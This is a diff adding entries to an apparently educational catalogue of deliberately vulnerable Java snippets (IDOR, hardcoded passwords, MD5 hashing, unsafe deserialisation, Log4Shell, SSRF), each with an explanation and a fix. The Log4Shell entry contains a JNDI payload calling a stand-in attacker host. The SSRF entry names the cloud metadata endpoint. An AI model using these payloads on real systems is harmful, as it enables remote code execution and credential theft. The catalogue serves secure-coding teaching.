@@ -31,5 +31,93 @@
     "explanation": "Line 10 creates a `DocumentBuilderFactory` with default settings. By default, Java's XML parser supports external entity references (XXE). An attacker who controls the XML input can include a `<!DOCTYPE>` declaration with an `ENTITY` that reads a local file (e.g. `/etc/passwd`) or makes a network request to an internal service. Fix: disable external entity processing before parsing — call `factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)` immediately after creating the factory.",
     "source": "Adapted from OWASP XXE Prevention Cheat Sheet",
     "file": "java/intermediate/xxe-document-builder.java"
+  },
+  {
+    "snippetId": "d6a4f5b7-4567-4def-b112-000000000004",
+    "title": "Insecure Direct Object Reference via Request Parameter",
+    "language": "JAVA",
+    "difficulty": "BEGINNER",
+    "owaspCategory": "A01_BROKEN_ACCESS_CONTROL",
+    "vulnerableLines": [26],
+    "explanation": "Line 26 passes the `userId` request parameter directly into the SQL query without checking that it matches the currently authenticated user (retrieved on line 20 but never compared). An attacker can change the `userId` parameter in the URL to any other user's ID and retrieve their account balance and account number. Fix: replace `requestedUserId` with `loggedInUser` in the PreparedStatement, or assert they are equal before querying.",
+    "source": "Adapted from OWASP IDOR — Testing for Insecure Direct Object References (OTG-AUTHZ-004)",
+    "file": "java/beginner/idor-request-param.java"
+  },
+  {
+    "snippetId": "e7b5a6c8-5678-4ef0-c223-000000000005",
+    "title": "Hardcoded Admin Password in Source Code",
+    "language": "JAVA",
+    "difficulty": "BEGINNER",
+    "owaspCategory": "A07_IDENTIFICATION_AND_AUTHENTICATION_FAILURES",
+    "vulnerableLines": [10],
+    "explanation": "Line 10 stores the admin password as a plain-text string constant in source code. Anyone with read access to the repository — now or in git history — can extract the credential and authenticate as admin. Fix: store credentials outside the codebase (e.g. environment variables or a secrets manager) and compare against a securely hashed value rather than a literal string.",
+    "source": "Adapted from OWASP Authentication Cheat Sheet — Credential Storage",
+    "file": "java/beginner/hardcoded-password.java"
+  },
+  {
+    "snippetId": "f8c6b7d9-6789-4fa1-d334-000000000006",
+    "title": "MD5 Used for Password Hashing",
+    "language": "JAVA",
+    "difficulty": "INTERMEDIATE",
+    "owaspCategory": "A02_CRYPTOGRAPHIC_FAILURES",
+    "vulnerableLines": [11],
+    "explanation": "Line 11 uses MD5, a fast general-purpose hash, to store passwords. MD5 is cryptographically broken and its speed makes brute-force and rainbow-table attacks trivial — billions of MD5 hashes can be computed per second on commodity hardware. Fix: use a password-hashing function designed for this purpose — BCrypt, SCrypt, or Argon2 — which incorporate a salt and are intentionally slow.",
+    "source": "Adapted from OWASP Password Storage Cheat Sheet",
+    "file": "java/intermediate/md5-password-hash.java"
+  },
+  {
+    "snippetId": "a9d7c8e0-7890-4ab2-e445-000000000007",
+    "title": "Unsafe Java Deserialization from Cookie",
+    "language": "JAVA",
+    "difficulty": "INTERMEDIATE",
+    "owaspCategory": "A08_SOFTWARE_AND_DATA_INTEGRITY_FAILURES",
+    "vulnerableLines": [31, 32],
+    "explanation": "Lines 31–32 deserialise a Base64-decoded cookie value using Java's native `ObjectInputStream.readObject()` without any class allow-listing. An attacker can craft a malicious serialised Java object (using tools like ysoserial) and submit it as the cookie, triggering arbitrary code execution during deserialisation. Fix: never deserialise untrusted data with native Java serialisation; use a data-format like JSON with strict schema validation, or use a deserialisation filter (`ObjectInputFilter`) that allowlists only expected classes.",
+    "source": "Adapted from OWASP Deserialization Cheat Sheet",
+    "file": "java/intermediate/unsafe-deserialization.java"
+  },
+  {
+    "snippetId": "b0e8d9f1-8901-4bc3-f556-000000000008",
+    "title": "Plaintext Password Written to Application Log",
+    "language": "JAVA",
+    "difficulty": "INTERMEDIATE",
+    "owaspCategory": "A09_SECURITY_LOGGING_AND_MONITORING_FAILURES",
+    "vulnerableLines": [19],
+    "explanation": "Line 19 logs the user-supplied `password` value at INFO level on every login attempt. Anyone with access to the log files — including log aggregation systems, monitoring dashboards, or shared log storage — can read users' plaintext passwords. Fix: log only the username and a sanitised event marker (e.g. `login_attempt`) and never log credential values at any log level.",
+    "source": "Adapted from OWASP Logging Cheat Sheet — What to Exclude",
+    "file": "java/intermediate/password-logging.java"
+  },
+  {
+    "snippetId": "c1f9e0a2-9012-4cd4-a667-000000000009",
+    "title": "Race Condition in Balance Transfer",
+    "language": "JAVA",
+    "difficulty": "ADVANCED",
+    "owaspCategory": "A04_INSECURE_DESIGN",
+    "vulnerableLines": [19, 21],
+    "explanation": "Lines 19 and 21 read the account balance and then check it outside a database transaction or row-level lock. A concurrent request can read the same balance between these two lines, pass the insufficient-funds check, and both transfers proceed — allowing a user to spend the same funds twice (a double-spend). Fix: wrap the entire transfer in a database transaction with `SELECT ... FOR UPDATE` to lock the source row, ensuring the balance check and debit are atomic.",
+    "source": "Adapted from OWASP Race Conditions — TOCTOU (Time-of-check Time-of-use)",
+    "file": "java/advanced/race-condition-transfer.java"
+  },
+  {
+    "snippetId": "d2a0f1b3-0123-4de5-b778-000000000010",
+    "title": "Log4Shell: User Input in Log4j Format String",
+    "language": "JAVA",
+    "difficulty": "ADVANCED",
+    "owaspCategory": "A06_VULNERABLE_AND_OUTDATED_COMPONENTS",
+    "vulnerableLines": [22],
+    "explanation": "Line 22 concatenates unsanitised user input directly into a Log4j `logger.info()` call using string concatenation rather than a parameterised format string. On Log4j 2 versions prior to 2.17.1, this enables Log4Shell (CVE-2021-44228): if the username contains a JNDI lookup pattern such as `${jndi:ldap://attacker.com/a}`, Log4j resolves the JNDI reference and fetches attacker-controlled code, leading to remote code execution. Fix: upgrade Log4j to 2.17.1 or later, and always pass user input as a format argument (`logger.info(\"user: {}\", username)`) rather than by string concatenation.",
+    "source": "Adapted from CVE-2021-44228 (Log4Shell) — LunaSec advisory",
+    "file": "java/advanced/log4shell-pattern.java"
+  },
+  {
+    "snippetId": "e3b1a2c4-1234-4ef6-c889-000000000011",
+    "title": "Server-Side Request Forgery via URL Parameter",
+    "language": "JAVA",
+    "difficulty": "ADVANCED",
+    "owaspCategory": "A10_SERVER_SIDE_REQUEST_FORGERY",
+    "vulnerableLines": [31],
+    "explanation": "Line 31 passes the user-supplied `url` parameter directly to `URI.create()` with no allow-list or scheme validation. An attacker can supply an internal URL (e.g. `http://169.254.169.254/latest/meta-data/` for AWS instance metadata, or `http://internal-service/admin`) causing the server to make requests on the attacker's behalf to systems that are not publicly accessible. Fix: validate the URL against an explicit allow-list of permitted hostnames and schemes before making the request, and block private IP ranges.",
+    "source": "Adapted from OWASP SSRF Prevention Cheat Sheet",
+    "file": "java/advanced/ssrf-url-fetch.java"
   }
 ]
